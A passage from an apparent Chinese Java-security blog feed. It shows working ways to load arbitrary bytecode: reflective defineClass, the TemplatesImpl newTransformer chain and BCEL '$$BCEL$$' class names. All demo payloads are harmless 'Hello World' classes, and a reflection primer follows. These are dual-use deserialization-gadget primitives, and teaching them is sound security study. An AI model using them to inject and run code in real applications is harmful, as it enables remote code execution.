<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClassLoaderTest</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span>&#123;		<span class="comment">//继承ClassLoader</span></span><br><span class="line">    <span class="keyword">public</span> String classPath;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ClassLoaderTest</span> <span class="params">(String classPath)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.classPath=classPath;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">byte</span>[] classByte=loadClassData(name);</span><br><span class="line">        <span class="comment">//将字节码交给defineClass()方法，在内存中创建CLass类对象</span></span><br><span class="line">        <span class="keyword">return</span> defineClass(name,classByte,<span class="number">0</span>, classByte.length);		</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//loadClassData用来读取字节码文件</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">byte</span>[] loadClassData(String className)&#123;		</span><br><span class="line">        String classFilePath=classPath+className.replace(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;/&quot;</span>)+<span class="string">&quot;.class&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span>(FileInputStream fis=<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(classFilePath))&#123;</span><br><span class="line">            <span class="type">byte</span>[] buffer=<span class="keyword">new</span> <span class="title class_">byte</span>[fis.available()];</span><br><span class="line">            fis.read(buffer);</span><br><span class="line">            <span class="keyword">return</span> buffer;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        ClassLoaderTest classLoaderTest=<span class="keyword">new</span> <span class="title class_">ClassLoaderTest</span>(<span class="string">&quot;./Serialization/src/main/java/&quot;</span>);</span><br><span class="line">        Class cls=classLoaderTest.findClass(<span class="string">&quot;org.example.Hello&quot;</span>);</span><br><span class="line">        cls.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>执行代码，发现成功加载<code>Hello.class</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230813170926248.png"
                      alt="image-20230813170926248"
                ></p>
<h3 id="ClassLoader-define-直接加载字节码"><a href="#ClassLoader-define-直接加载字节码" class="headerlink" title="ClassLoader#define()直接加载字节码"></a>ClassLoader#define()直接加载字节码</h3><p>从上面的自定义ClassLoader代码中可以看到，<code>findClass()</code>将字节码文件以byte的形式读取。之后交给<code>defineClass()</code>处理生成Class类。</p>
<p>我们可以尝试跳过<code>findClass()</code>方法，直接将字节码给<code>defineClass()</code></p>
<p>首先编写Hello.java，并将其编译为Hello.class</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Hello</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello World&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为字节码是byte形式的，为了方便我们这里将其读取为base64</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./Serialization/src/main/java/org/example/Hello.class&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[fis.available()];</span><br><span class="line">            fis.read(buffer);</span><br><span class="line">            <span class="type">String</span> <span class="variable">bytes2base64</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(buffer);</span><br><span class="line">            System.out.println(bytes2base64);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将读取到的base64字符串进行解码，并传递给<code>ClassLoader#defineClass</code>处理。</p>
<p>这里有个需要注意的点：<code>defineClass()</code>方法的第一个参数应当为类的全称。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TmpClassLoader</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">defineClass</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">        defineClass.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytes= Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQARb3JnL2V4YW1wbGUvSGVsbG8BABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoAAAAOAAMAAAAEAAQABQAMAAYAAQALAAAAAgAM&quot;</span>);</span><br><span class="line">        Class Hello= (Class) defineClass.invoke(ClassLoader.getSystemClassLoader(),<span class="string">&quot;org.example.Hello&quot;</span>,bytes,<span class="number">0</span>,bytes.length);</span><br><span class="line">        Hello.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行后发现成功打印字符串</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230814141217224.png"
                      alt="image-20230814141217224"
                ></p>
<h2 id="TemplatesImpl类加载字节码"><a href="#TemplatesImpl类加载字节码" class="headerlink" title="TemplatesImpl类加载字节码"></a>TemplatesImpl类加载字节码</h2><p><strong>PS:有一个巨巨巨坑的点，环境要是JDK8。JDK9之后采取模块化设计，某些包可能被模块限制在某个范围内，导致不能直接导入这些包中的类</strong></p>
<p><code>ClassLoader#defineClass()</code>是protected修饰，无法直接在外部进行利用。因此，这里引入一个新的类：<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code></p>
<p>在<code>TemplatesImpl</code>中存在内部类<code>TransletClassLoader</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">TransletClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String,Class&gt; _loadedExternalExtensionFunctions;</span><br><span class="line"></span><br><span class="line">     TransletClassLoader(ClassLoader parent) &#123;</span><br><span class="line">         <span class="built_in">super</span>(parent);</span><br><span class="line">        _loadedExternalExtensionFunctions = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    TransletClassLoader(ClassLoader parent,Map&lt;String, Class&gt; mapEF) &#123;</span><br><span class="line">        <span class="built_in">super</span>(parent);</span><br><span class="line">        _loadedExternalExtensionFunctions = mapEF;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; loadClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        Class&lt;?&gt; ret = <span class="literal">null</span>;</span><br><span class="line">        <span class="comment">// The _loadedExternalExtensionFunctions will be empty when the</span></span><br><span class="line">        <span class="comment">// SecurityManager is not set and the FSP is turned off</span></span><br><span class="line">        <span class="keyword">if</span> (_loadedExternalExtensionFunctions != <span class="literal">null</span>) &#123;</span><br><span class="line">            ret = _loadedExternalExtensionFunctions.get(name);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (ret == <span class="literal">null</span>) &#123;</span><br><span class="line">            ret = <span class="built_in">super</span>.loadClass(name);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Access to final protected superclass member from outer class.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    Class <span class="title function_">defineClass</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] b)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> defineClass(<span class="literal">null</span>, b, <span class="number">0</span>, b.length);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到<code>TransletClassLoader</code>对<code>defineClass()</code>进行了重写。并且此处没有使用<code>protected</code>修饰符。</p>
<p>在<code>TemplatesImpl</code>中存在如下利用链</p>
<blockquote>
<p><code>TemplatesImpl#getOutputProperties()</code>-&gt;<code>TemplatesImpl#newTransformer()</code>-&gt;<code>TemplatesImpl#getTransletInstance()</code>-&gt;<code>TemplatesImpl#defineTransletClasses()</code>-&gt;<code>TransletClassLoader#defineClass()</code></p>
</blockquote>
<p>其中<code>getOutputProperties()</code>和<code>newTransformer()</code>方法均为public修饰。因此可以调用这两个方法，来加载字节码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TemplatesImplStu</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">SetFieldValue</span><span class="params">(String FieldName,Object object,Object value)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Field field=object.getClass().getDeclaredField(FieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object,value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        TemplatesImpl templates=<span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] bytes= Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABVUZW1wbGF0ZXNJbXBsQ2xzLmphdmEMAA4ADwcAGwwAHAAdAQAMSGVsbG8gV29ybGQhBwAeDAAfACABABBUZW1wbGF0ZXNJbXBsQ2xzAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgAhAAUABgAAAAAAAwABAAcACAACAAkAAAAZAAAAAwAAAAGxAAAAAQAKAAAABgABAAAADAALAAAABAABAAwAAQAHAA0AAgAJAAAAGQAAAAQAAAABsQAAAAEACgAAAAYAAQAAABEACwAAAAQAAQAMAAEADgAPAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoAAAAOAAMAAAATAAQAFAAMABUAAQAQAAAAAgAR&quot;</span>);</span><br><span class="line">        SetFieldValue(<span class="string">&quot;_name&quot;</span>,templates,<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        SetFieldValue(<span class="string">&quot;_bytecodes&quot;</span>,templates,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        SetFieldValue(<span class="string">&quot;_tfactory&quot;</span>,templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        templates.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码中的三个<code>SetFieldValue()</code>均是为了成功的走通整条链而设置的内部成员变量。比较简单，就不分析了。</p>
<p>需要注意的是<code>TemplatesImpl</code>对加载的字节码有要求。字节码对应的类必须是<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>的子类。</p>
<blockquote>
<p><code>TemplatesImpl</code> 类是Xalan中的一个类，用于表示编译后的 XSLT 样式表。<br><code>AbstractTranslet</code> 类是Xalan 中的一个基类，它为XSLT样式表的转换提供了基本的支持。<br><code>TemplatesImpl</code> 作为编译后的样式表，需要能够与 <code>AbstractTranslet</code> 类进行交互，以便在运行时执行 XSLT 转换。这就是为什么 <code>TemplatesImpl</code> 类对应的类必须是 <code>AbstractTranslet</code> 的子类。</p>
</blockquote>
<p>因此需要构造一个特殊的类:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TemplatesImplCls</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM var1, SerializationHandler[] var2)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM var1, DTMAxisIterator var2, SerializationHandler var3)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TemplatesImplCls</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里需要注意的是：<code>TemplatesImplCls</code>类没有package。这是因为<code>TemplatesImpl#TransletClassLoader#defineClass()</code>中调用的<code>defineClass()</code>第一个参数是null。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class <span class="title function_">defineClass</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] b)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> defineClass(<span class="literal">null</span>, b, <span class="number">0</span>, b.length);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230816105904985.png"
                      alt="image-20230816105904985"
                ></p>
<h2 id="BCEL-ClassLoader加载字节码"><a href="#BCEL-ClassLoader加载字节码" class="headerlink" title="BCEL ClassLoader加载字节码"></a>BCEL ClassLoader加载字节码</h2><p><strong>PS:BCEL ClassLoader在jdk1.8.0_251被移除</strong></p>
<p>BCEL的全名应该是Apache Commons BCEL，属于Apache Commons项目下的一个子项目。BCEL库提供了一系列用于分析、创建、修改Java Class文件的API。</p>
<p>在BCEL中存在一个ClassLoader：<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code> ，其重写了<code>loadClass()</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class <span class="title function_">loadClass</span><span class="params">(String class_name, <span class="type">boolean</span> resolve)</span></span><br><span class="line">  <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">Class</span> <span class="variable">cl</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First try: lookup hash table.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">if</span>((cl=(Class)classes.get(class_name)) == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="comment">/* Second try: Load system class using system class loader. You better</span></span><br><span class="line"><span class="comment">     * don&#x27;t mess around with them.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i &lt; ignored_packages.length; i++) &#123;</span><br><span class="line">      <span class="keyword">if</span>(class_name.startsWith(ignored_packages[i])) &#123;</span><br><span class="line">        cl = deferTo.loadClass(class_name);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(cl == <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="type">JavaClass</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Third try: Special request?</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">if</span>(class_name.indexOf(<span class="string">&quot;$$BCEL$$&quot;</span>) &gt;= <span class="number">0</span>)</span><br><span class="line">        clazz = createClass(class_name);</span><br><span class="line">      <span class="keyword">else</span> &#123; <span class="comment">// Fourth try: Load classes via repository</span></span><br><span class="line">        <span class="keyword">if</span> ((clazz = repository.loadClass(class_name)) != <span class="literal">null</span>) &#123;</span><br><span class="line">          clazz = modifyClass(clazz);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(class_name);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes  = clazz.getBytes();</span><br><span class="line">        cl = defineClass(class_name, bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="comment">// Fourth try: Use default class loader</span></span><br><span class="line">        cl = Class.forName(class_name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(resolve)</span><br><span class="line">      resolveClass(cl);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  classes.put(class_name, cl);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> cl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>简单来分析一下</p>
<p>首先判断class_name中是否有$$BCEL$$，若存在则执行<code>createClass()</code>，若不存在则使用类加载器直接生成JavaClass类。（JavaClass为BCEL中的自定义类）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(cl == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Third try: Special request?</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span>(class_name.indexOf(<span class="string">&quot;$$BCEL$$&quot;</span>) &gt;= <span class="number">0</span>)</span><br><span class="line">          clazz = createClass(class_name);</span><br><span class="line">        <span class="keyword">else</span> &#123; <span class="comment">// Fourth try: Load classes via repository</span></span><br><span class="line">          <span class="keyword">if</span> ((clazz = repository.loadClass(class_name)) != <span class="literal">null</span>) &#123;</span><br><span class="line">            clazz = modifyClass(clazz);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(class_name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">          <span class="type">byte</span>[] bytes  = clazz.getBytes();</span><br><span class="line">          cl = defineClass(class_name, bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="comment">// Fourth try: Use default class loader</span></span><br><span class="line">          cl = Class.forName(class_name);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<p><code>createClass()</code>会将$$BCEL$$后的内容解码，并生成JavaClass类。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> JavaClass <span class="title function_">createClass</span><span class="params">(String class_name)</span> &#123;</span><br><span class="line">  <span class="type">int</span>    <span class="variable">index</span>     <span class="operator">=</span> class_name.indexOf(<span class="string">&quot;$$BCEL$$&quot;</span>);</span><br><span class="line">  <span class="type">String</span> <span class="variable">real_name</span> <span class="operator">=</span> class_name.substring(index + <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">JavaClass</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="type">byte</span>[]      bytes  = Utility.decode(real_name, <span class="literal">true</span>);</span><br><span class="line">    <span class="type">ClassParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassParser</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes), <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">    clazz = parser.parse();</span><br><span class="line">  &#125; <span class="keyword">catch</span>(Throwable e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>最后JavaClass经过处理，变为Java原生Class类。</p>
<p>我们尝试将之前的Hello.class读取为BCEL字节码并加载</p>
<p>这里用到了两个类：Repository和Utility。Repository可以将字节码转换为JavaClass类对象。Utility可以将JavaClass类对象转换为BCEL字节码。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BcelStu</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//类加载器寻找要编码的类</span></span><br><span class="line">        JavaClass jcls= Repository.lookupClass(Hello.class);</span><br><span class="line">        <span class="comment">//对类进行编码，第二个参数表示是否在编码时进行压缩</span></span><br><span class="line">        String code= <span class="string">&quot;$$BCEL$$&quot;</span>+Utility.encode(jcls.getBytes(),<span class="literal">true</span>);      </span><br><span class="line">        System.out.println(code);</span><br><span class="line">        Object obj=<span class="keyword">new</span> <span class="title class_">ClassLoader</span>().loadClass(code).newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/image-20230816155355375.png"
                      alt="image-20230816155355375"
                ></p>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反射</title>
    <url>/2023/06/08/Java%E5%8F%8D%E5%B0%84/</url>
    <content><![CDATA[<p>反射：将类的各个组成部分封装为其他对象。</p>
<p>Java代码在计算机中经历了三个阶段：源代码阶段-&gt;Class对象阶段-&gt;Runtime运行时阶段。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/1659361692184-df5e15a2-0ff1-47d0-9767-d95ef24a9903.png"
                      alt="image.png"
                ></p>
<p>源代码阶段：在编辑器中写的便是源代码。以.java做后缀。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/1658958834552-6f17393d-7d2a-4ef5-bdb4-eb180dd3c51c.png"
                      alt="image.png"
                ></p>
<p>使用javac命令可以将.java文件编译为字节码文件，以.class结尾。此时认为仍处于源代码阶段。如下为class文件，具体含义暂不做分析。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://yearnxyl.oss-cn-beijing.aliyuncs.com/img/1659050135411-8ee0b254-39b0-4a46-87db-932e25cb1f06.png"
                      alt="image.png"
                ></p>
<p>Class类对象阶段：使用javac编译成的字节码文件经过jvm中ClassLoader的加载，在内存中生成Class类对象。Class类对象由成员变量Field、构造方法Constructor、成员方法Method组成。以上面Person对象为例，经过ClassLoader加载，name和age两个成员变量封装为Field[]对象，Person(){}方法封装为Constructor[]对象，eat(){}方法封装为Methods[]对象。而这个封装的过程便是反射机制。</p>
<p>Runtime阶段：实例化类对象，在内存中生成实例化对象。</p>
<h3 id="获取Class类对象的四种方法"><a href="#获取Class类对象的四种方法" class="headerlink" title="获取Class类对象的四种方法"></a>获取Class类对象的四种方法</h3><p><code>反射的作用：获取Class类对象。</code></p>
<p>针对Java代码在计算机的不同阶段，存在不同的方法来获取Class类对象。</p>
<ol>
<li>源代码阶段：Class.forName(“全类名”)：将字节码文件加载进内存，返回Class类对象。</li>
